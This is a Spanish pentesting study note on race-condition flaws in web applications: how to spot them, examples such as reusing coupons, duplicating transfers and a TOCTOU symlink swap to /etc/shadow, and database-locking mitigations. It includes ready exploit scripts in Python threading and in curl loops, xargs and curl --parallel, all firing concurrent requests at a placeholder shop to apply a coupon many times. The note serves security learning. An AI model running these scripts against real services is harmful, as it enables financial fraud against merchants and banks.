
---
Tags: #web #race-condition #concurrency #pentesting #bugbounty #owasp #exploitation #toctou

---
## 📖 Definición

Una **condición de carrera (Race Condition)** ocurre cuando **dos o más procesos acceden o modifican un recurso compartido al mismo tiempo**, y el resultado final depende del orden en que se ejecuten.

En aplicaciones web esto suele significar:

- **Evadir restricciones** (ej: límites de dinero, cupones de descuento, puntos).
    
- **Acceder a datos indebidos**.
    
- **Escalar privilegios** o conseguir más recursos de los permitidos.
    

---

## 🔍 Cómo descubrirlas

### 🔹 Sin acceso al código

- **Acciones críticas** que deberían ser atómicas (ej: transferencias de dinero, uso de cupones).
    
- Botones de **“Comprar”**, **“Canjear”** o **“Confirmar”** → ¿qué pasa si se envían varias veces rápidamente?
    
- Revisar en Burp Suite o el navegador si es posible **reenviar la misma petición** varias veces.
    
- Señales típicas:
    
    - Mensajes como _“Cupón ya usado”_, pero aun así se aplica el descuento.
        
    - Saldo negativo o inconsistencias en inventarios.
        
    - Dos respuestas diferentes para la misma acción.
        

### 🔹 Con acceso al código

- Falta de **bloqueos** (locks) en recursos compartidos.
    
- Uso de operaciones no atómicas, ej:
    
    `SELECT balance FROM cuentas WHERE id=1; UPDATE cuentas SET balance=balance-100 WHERE id=1;`
    
    ⚠️ Si se ejecutan al mismo tiempo, ambos hilos leen el mismo balance inicial.
    
- Variables compartidas en memoria **sin sincronización**.
    
- Archivos temporales que se escriben/leen sin control.
    

---

## 🎯 Ejemplos Prácticos

### 1. **Duplicar dinero en un banco online**

Si un usuario tiene $100 y transfiere $100 a otra cuenta:

- Petición:
    
    `POST /transfer {   "from": "user1",   "to": "user2",   "amount": 100 }`
    
- Si envías **2 peticiones al mismo tiempo**, ambas leen el saldo de 100 antes de actualizar → la cuenta destino recibe $200.
    

---

### 2. **Cupón de descuento**

Un cupón de `-50%` solo debería usarse una vez.  
Si el usuario manda varias peticiones simultáneamente:

- Cupón aplicado múltiples veces.
    
- Resultado: compras gratis.
    

---

### 3. **Carrera de archivos (TOCTOU - Time Of Check To Time Of Use)**

Ejemplo en Linux:  
Un programa valida que un archivo sea seguro antes de abrirlo:

`if (access("/tmp/file", R_OK)) {     fd = open("/tmp/file", O_RDONLY); }`

⚠️ Entre el **check** y el **use**, un atacante cambia el symlink `/tmp/file` a `/etc/shadow`.

---

### 4. **API de puntos/recompensas**

Cada compra suma puntos.  
Si mandas varias peticiones al endpoint `POST /addPoints` al mismo tiempo, puedes multiplicar los puntos más de lo debido.

---

## 🛠️ Métodos de Explotación

### 🔹 Manual

- Usar **Burp Suite Repeater** con la opción “Send group (parallel)”.
    
- Usar el navegador y hacer clics múltiples muy rápidos.
    
- Probar con **CTRL+Shift+R** o reenvíos simultáneos.
    

### 🔹 Automático

- Script en Python para enviar muchas peticiones en paralelo:
    

```python
import requests
import threading  

url = "http://victima.com/transfer"
data = {"from": "user1", "to": "user2", "amount": 100}

def attack():
    r = requests.post(url, json=data)
    print(r.status_code, r.text)

threads = []

# Lanzamos 10 hilos simultáneos
for i in range(10):
    t = threading.Thread(target=attack)
    threads.append(t)
    t.start()

# Esperamos que todos acaben
for t in threads:
    t.join()

```

- Herramientas:
    
    - **Turbo Intruder** (plugin de Burp Suite).
        
    - **Racepwn**.
        
    - **ffuf** con multihilos.
        

---

## ⚠️ Impacto

- **Fraude financiero** (duplicar dinero, descuentos infinitos).
    
- **Acceso a archivos sensibles** (TOCTOU).
    
- **Escalada de privilegios** (obtener permisos indebidos).
    
- **Consumo de recursos** (ej: generar miles de cuentas, créditos).
    

---

## 🛡️ Medidas de Mitigación

- Uso de **bloqueos atómicos** en base de datos (ej: `SELECT ... FOR UPDATE`).
    
- Implementar **transacciones** en operaciones críticas.
    
- Usar **tokens de un solo uso** para acciones sensibles (ej: canje de cupones).
    
- Validar siempre **del lado del servidor**, no confiar en el cliente.
    
- En sistemas de archivos → usar funciones seguras (ej: `open()` con flags que eviten TOCTOU).
    

---
## Ejemplo práctico de explotación con `curl`

Supongamos que tenemos un endpoint vulnerable:

`POST http://victima.com/cart/apply-coupon`

Con un JSON como este:

`{   "coupon": "DISCOUNT100" }`

---

### 1️⃣ Crear archivo con la petición

Guarda la petición en un archivo `coupon.json`:

`{"coupon": "DISCOUNT100"}`

---

### 2️⃣ Lanzar varias peticiones concurrentes con `curl`

`for i in $(seq 1 20); do    curl -s -X POST http://victima.com/cart/apply-coupon \     -H "Content-Type: application/json" \     -H "Cookie: session=YOURSESSIONID" \     -d @coupon.json & done wait`

🔎 Explicación:

- `for i in $(seq 1 20)` → lanza 20 peticiones.
    
- `-d @coupon.json` → envía el cuerpo con el cupón.
    
- `&` → ejecuta cada petición en background (casi al mismo tiempo).
    
- `wait` → espera a que terminen todas.
    

---

### 3️⃣ Comprobar si funcionó

Después, revisa tu carrito o saldo con otra petición:

`curl -s -b "session=YOURSESSIONID" http://victima.com/cart`

Si el sitio es vulnerable, verás que el cupón se aplicó múltiples veces → producto gratis o saldo negativo. 🎉

---

## 🔹 Variante con `xargs` para lanzar aún más rápido

`seq 1 50 | xargs -n1 -P50 -I{} curl -s -X POST http://victima.com/cart/apply-coupon \   -H "Content-Type: application/json" \   -H "Cookie: session=YOURSESSIONID" \   -d @coupon.json`

- `-P50` → lanza 50 peticiones en paralelo.
    
- `-n1` → cada ejecución consume un número del `seq`.

---
## Ataque con Curl y xargs prara hacer peticiones mas RAPIDO

Guarda cada petición en un archivo de texto `coupons.txt`:

`url = "http://victima.com/cart/apply-coupon" content-type = application/json cookie = session=YOURSESSIONID data = {"coupon":"DISCOUNT100"}`

Cópialo tantas veces como peticiones quieras lanzar (por ejemplo, 20 veces).

---

## 🔹 Paso 2: Ejecutar con `--parallel`

`curl --parallel --parallel-max 20 --config coupons.txt`

- `--parallel` → activa el modo concurrente.
    
- `--parallel-max 20` → lanza hasta 20 conexiones en paralelo.
    
- `--config coupons.txt` → carga las peticiones desde el archivo.
    

---

## 🔹 Variante rápida (sin archivo intermedio)

También puedes construirlo al vuelo con un **heredoc**:

`curl --parallel --parallel-max 20 --config - <<EOF url = "http://victima.com/cart/apply-coupon" content-type = application/json cookie = session=YOURSESSIONID data = {"coupon":"DISCOUNT100"} url = "http://victima.com/cart/apply-coupon" content-type = application/json cookie = session=YOURSESSIONID data = {"coupon":"DISCOUNT100"} EOF`

En este caso repetimos varias veces el bloque `url = ...` dentro del heredoc.

---

## 🔹 Paso 3: Verificar resultado

Una vez lanzadas, comprueba si el cupón se aplicó múltiples veces:

`curl -s -b "session=YOURSESSIONID" http://victima.com/cart`

---

👉 Con `--parallel` el envío es **mucho más rápido** que con bucles en `bash`, lo que aumenta la probabilidad de ganar la carrera.